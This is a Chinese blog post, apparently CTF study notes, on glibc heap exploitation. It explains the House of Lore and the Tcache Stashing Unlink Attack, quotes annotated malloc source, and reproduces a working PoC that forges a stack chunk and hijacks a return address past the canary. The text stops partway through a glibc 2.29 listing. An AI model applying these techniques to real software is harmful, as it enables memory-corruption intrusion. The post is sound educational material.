<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;h3 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;上一篇讲述了许多新型house系列方法利用下都要用到的gadget——setcontext。我们在做题过程中一定也会想要用unlink进行提权的前期处理，但是在2.29往上，对unlink的保护机制越来越多，越来越难利用。这时候就发现了一种更方便的unlink">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>libc_heap(2) | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/03/21/heap2/">libc_heap(2)</a></h1>
  <aside>
    
    <time datetime="222022-03-21">
      March 21st 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/study/">study</a></li>
    
    </ul>
  </aside>
</header>

  <div><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上一篇讲述了许多新型house系列方法利用下都要用到的gadget——setcontext。我们在做题过程中一定也会想要用unlink进行提权的前期处理，但是在2.29往上，对unlink的保护机制越来越多，越来越难利用。这时候就发现了一种更方便的unlink方式——Tcache Stashing Unlink Attack。从本来任意写一个指定值或可扩大到任意地址分配chunk进而做到任意地址读写。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Tcache Stashing Unlink Attack是一种利用了Smallbi的相关分配机制进行的攻击。</p>
<h3 id="前置知识讲解"><a href="#前置知识讲解" class="headerlink" title="前置知识讲解"></a>前置知识讲解</h3><p>说到Smallbin相关分配的攻击，那就必须要从House of Lore来讲解一下。</p>
<h4 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h4><h5 id="利用思想"><a href="#利用思想" class="headerlink" title="利用思想"></a>利用思想</h5><p>house_of_lore是一种对于small_bin机制的利用，通过其他手段如果可以把bin-&gt;bk替换为small_bin头chunk的bk，再提前设置好头chunk的bk，指向伪造的fake_chunk。这样再次申请内存时就可以申请到fake_chunk，是故可以泄露任何地址、或是修改其内容。<br /></p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>首先看下smallbin范围内堆块申请的流程：</p>
<p>（注释写的比较清楚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">        <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">        <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// 细致的检查</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">                <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样仔细来看，是有一个漏洞的，就是在smallbin中存在其他堆块的时候，我们通过审查源码可以发现如果能够将头chunk的bk修改并且指向fake_chunk并通过偶检查，在取走头部chunk之后，fake_chunk就成为了挂在bk链的首部。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>首先就是最重要的条件，就是能够申请一块或者得到一块smallbin大小的chunk。其次，就是在smallbin的bk指针处能够伪造一个fake_chunk，这就要求我们必须可以控制smallbin的bk指针，并且可以提前布置好fakechunk并且指向smallchunk的头部。并且fake_chunk能够通过fd的检测：__glibc_unlikely(bck-&gt;fd !&#x3D; victim)</p>
<h5 id="poc调试"><a href="#poc调试" class="headerlink" title="poc调试"></a>poc调试</h5><p>从网上巴拉了how2heap  House Of Lore的POC</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是申请了一个fastbin范围内的vittim chunk</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401153330-tc7f1ls.png" alt="image.png"></p>
<p>还在栈上整了一个fake chunk，然后是为了绕过程序的检测所以将stack_buffer_1 的 bk 指针指向 stack_buffer_2、stack_buffer_2 的 fd 指针指向 stack_buffer_1</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401153512-pl1g9hf.png" alt="image.png"></p>
<p>之后我们再去malloc一个chunk用来防止上一个堆快free之后与top chunk合并，然后free掉victim之后会放入fastbin中</p>
<p>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中。这样我们就得到了一个small bin，之后我们改smallbin中的victim chunk的bk为stack_buffer_1，这样的话我们malloc两次就可以得到0x7fff75206750。</p>
<h6 id="简单来说"><a href="#简单来说" class="headerlink" title="简单来说"></a>简单来说</h6><p>其实，我觉得这样理解的话挺麻烦的，反正我一开始学的时候就绕晕了。可以用简单的话来总结这个利用。就是先伪造，在一个可以leak出地址的地方伪造一个fake chunk的chunk头；然后获得一个smallbin并且将其bk指针修改为fake chunk地址，再分配两个堆块就可以分配到fake chunk，利用这个漏洞可以实现任意地址申请堆块，进而转化为任意地址读写。</p>
<p>还有就是，有的触发unlink就是为了得到地址相同的fastbin，从而实现fastbin attack；有的是为了使得更改某地址上的值。前者可以粗犷地让fd和bk都指向被unlink的chunk，同时被unlink的chunk的fd和bk都指向回来；后者被unlink chunk的fd&#x2F;bk处即&amp;x被改写为x-0x10又被改写为x-0x18。<br /></p>
<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>感觉利用条件一点点苛刻实际上是有了calloc函数之后什么都好说。</p>
<p>1、需要用户能够控制small bin chunk的bk指针</p>
<p>2、程序可以跳过tcache bin申请chunk（可以用calloc函数，这个是最难解决的也是最好解决的）</p>
<p>3、程序可以分配两种或两种以上的unsorted bin大小的堆块。</p>
<h4 id="利用目的"><a href="#利用目的" class="headerlink" title="利用目的"></a>利用目的</h4><p>1、向任意指定位置写入可控的值。</p>
<p>2、向任意地址分配一个chunk，即：任意地址读写。</p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>最关键的就是有一个calloc能够跨过tcachebin申请堆块，calloc会遍历fastbin、smallbin、largebin，如果在tcache bin里，对应的size的bin不为空，则会将这些bin的chunk采用头插法插入到tcache bin里。这就是Tcache Stashing Unlink Attack的核心。先来看一下glibc的源码（有关Tcache Stashing Unlink Attack利用的部分）：</p>
<p>版本：glibc-2.29</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot; </span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary. </span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are </span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact </span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.) </span></span><br><span class="line"><span class="comment">   */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))  </span><br><span class="line">    &#123;  </span><br><span class="line">      idx = smallbin_index (nb);  </span><br><span class="line">      bin = bin_at (av, idx);  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">//取该索引对应的small bin中最后一个chunk  </span></span><br><span class="line">        &#123;  </span><br><span class="line">          bck = victim-&gt;bk;  <span class="comment">//获取倒数第二个chunk  </span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//检查双向链表完整性  </span></span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);  </span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);  </span><br><span class="line">          bin-&gt;bk = bck; <span class="comment">//将victim从small bin的链表中卸下  </span></span><br><span class="line">          bck-&gt;fd = bin;  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">        set_non_main_arena (victim);  </span><br><span class="line">          check_malloced_chunk (av, victim, nb);  </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE  </span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size, </span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span>  </span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">//获取对应size的tcache索引  </span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//如果该索引在tcache bin范围  </span></span><br><span class="line">        &#123;  </span><br><span class="line">          mchunkptr tc_victim;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  </span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">//当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里  </span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)  </span><br><span class="line">        &#123;  </span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)  </span><br><span class="line">            &#123;  </span><br><span class="line">              bck = tc_victim-&gt;bk;  </span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);  </span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">            set_non_main_arena (tc_victim);  </span><br><span class="line">              bin-&gt;bk = bck; <span class="comment">//将当前chunk从small bin里卸下  </span></span><br><span class="line">              bck-&gt;fd = bin;  </span><br><span class="line">                      <span class="comment">//放入tcache bin里  </span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">          <span 